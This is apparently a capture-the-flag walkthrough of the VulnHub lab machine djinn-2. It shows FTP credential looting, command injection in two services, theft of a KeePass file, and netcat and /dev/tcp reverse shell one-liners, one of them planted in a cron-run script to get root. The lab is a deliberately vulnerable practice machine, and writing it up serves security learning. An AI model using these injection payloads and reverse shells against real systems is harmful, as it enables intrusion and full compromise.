Hi all, let's pwn this box.

You can find the machine there > [djinn2](https://www.vulnhub.com/entry/djinn-2,420/){:target="_blank"}

Let's start as always with a nmap scan.

```bash
$ ip=192.168.1.4

```

Lot of stuff to enumerate, let's start with `FTP` since we have anonymous access. We can see lot of files, let's download them all.

```bash
$ ftp $ip
Connected to 192.168.1.4.
220 (vsFTPd 3.0.3)
Name (192.168.1.4:root): anonymous

```

We got some creds, tried to ssh login with them but no luck. And 2 messages.

```bash
$ cat creds.txt 
nitu:7846A$56
$ cat game.txt 
@0xmzfr I would like to thank you for hiring me. I won't disappoint you like SAM.
Also I've started implementing the secure way of authorizing the access to our 
network. I have provided @nitish81299 with the beta version of the key fob
hopes everything would be good.

- @Ugtan_
$ cat message.txt 
@nitish81299, you and sam messed it all up. I've fired sam for all the fuzz he created and 
this will be your last warning if you won't put your shit together than you'll be gone as well.
I've hired @Ugtan_ as our new security head, hope  he'll do something good.

- @0xmzfr
```

Let's start the enumeration on port `7331`, let's run `gobuster` on it.

```bash
$ gobuster dir -q -u http://$ip:7331/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .php,.txt,.html -o gobuster.txt
/source (Status: 200)
/robots.txt (Status: 200)
/wish (Status: 200)
```

Source gives us a `python` code, i guess for port `5000` web app. Let's download it.

```bash
$ wget -q http://192.168.1.4:7331/source; mv source source.py
```

Let's analyze the code.

We can see this on the top of the script.

```python
URL = "http://{}:5000/?username={}&password={}"
```

I used `cURL` to test for `RCE`, after some tries i got it.

```bash
$ curl -s -X POST "http://$ip:5000/?username=whoami&password=t"
www-data
```

Perfect, i coded a small `RCE` exploit for it, you can find it there : [djinn exp](https://github.com/0xatom/0xatom.github.io/blob/master/scripts/exp.py)

Got shell :

![](https://i.ibb.co/w4KqG5n/Screenshot-3.png)

Now privesc, i found under `/var/backups` this `.kdbx` file.

`kdbx = KeePass Password Database`

You can install it it by running :

```
sudo apt-add-repository ppa:jtaylor/keepass
sudo apt-get update
sudo apt-get install keepass2 
```

Let's download this file using `base64`.

```bash
www-data@djinn:/var/backups$ python3 -c 'print(__import__("base64").b64encode(open("nitu.kdbx","rb").read()))'
...base64 data...
```

Now save this into a `.txt` and do this :

```bash
$ base64 -d base64.txt > nitu.kdbx
$ file nitu.kdbx 
nitu.kdbx: Keepass password database 2.x KDBX
```

Perfect, who needs meterpreter ;-)

Let's open the file now.

![](https://i.ibb.co/RB3nDFD/Screenshot-4.png)

Use the password we found before on `FTP` -> `nitu:7846A$56`

![](https://i.ibb.co/8PGZKbT/Screenshot-5.png)

Now we can login with `SSH`.

```bash
$ ssh nitish@$ip
nitish@192.168.1.4's password: 
nitish@djinn:~$
```

Perfect, now privesc is kinda tricky, let's list the listening connections with `netstat`.

```bash
nitish@djinn:~$ netstat -tnl
Active Internet connections (only servers)

tcp6       0      0 :::21                   :::*                    LISTEN

```

This seems interesting -> `127.0.0.1:2843`

Let's connect.

```bash
nitish@djinn:~$ nc localhost 2843
username: nitish
Password: &HtMGd$LJB
1. Show all members.
2. Add a new user.
3. Show all tasks.
4. Add a new task.
5. Add a note for admin.
6. Read notes.
7. Exit
=> 
```

I used the same creds, after some tries, i found a command injection `vulnerability` on `5. Add a note for admin.` :

```bash
=> 5

Name of the note: test;whoami
Description: test;whoami

Note added succesfully!

1. Show all members.
2. Add a new user.
3. Show all tasks.
4. Add a new task.
5. Add a note for admin.
6. Read notes.
7. Exit
=> 6
1 Important.txt
2 test;whoami

===> 2
cat: test: No such file or directory
test;whoami b'ugtan\n'
```

Perfect, we can get shell as `ugtan`, let's simply add a reverse shell.

```bash
=> 5

Name of the note: lol; rm /tmp/t;mkfifo /tmp/t;cat /tmp/t|/bin/sh -i 2>&1|nc your_ip 6666 >/tmp/t
Description: lol; rm /tmp/t;mkfifo /tmp/t;cat /tmp/t|/bin/sh -i 2>&1|nc your_ip 6666 >/tmp/t

Note added succesfully!

1. Show all members.
2. Add a new user.
3. Show all tasks.
4. Add a new task.
5. Add a note for admin.
6. Read notes.
7. Exit
=> 6
1 Important.txt
2 lol; rm /tmp/t;mkfifo /tmp/t;cat /tmp/t|/bin/sh -i 2>&1|nc 192.168.1.13 6666 >/tmp/t

===> 2
```

We have shell!

```bash
$ nc -lvp 6666
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
ugtan@djinn:/$
```

Now privesc to `root` is really simple, if we go to `/var/mail` we can read an email.

```bash
ugtan@djinn:/var/mail$ ls
ls
root  ugtan
ugtan@djinn:/var/mail$ cat ugtan
cat ugtan

Hey 0xmzfr,
I've setup the folder that you asked me to make in my home directory,
Since I'd be gone for a day or two you can just leave the clean.sh in
that directory and cronjob will handle the rest. 

- Ugtan_
```

We just have to create the `clean.sh` with our payload in.

```bash
ugtan@djinn:/home/ugtan/best/admin/ever$ touch clean.sh
touch clean.sh
ugtan@djinn:/home/ugtan/best/admin/ever$ echo "bash -i >& /dev/tcp/$your_ip/7777 0>&1" > clean.sh
```

Few seconds later..

```bash
$ nc -lvp 7777
root@djinn:~# whoami
whoami
root
root@djinn:~# 
```

Let's read the flag.

```bash
root@djinn:~# bash proof.sh
bash proof.sh
TERM environment variable not set.
proof.sh: line 9: figlet: command not found
djinn-2 pwned...
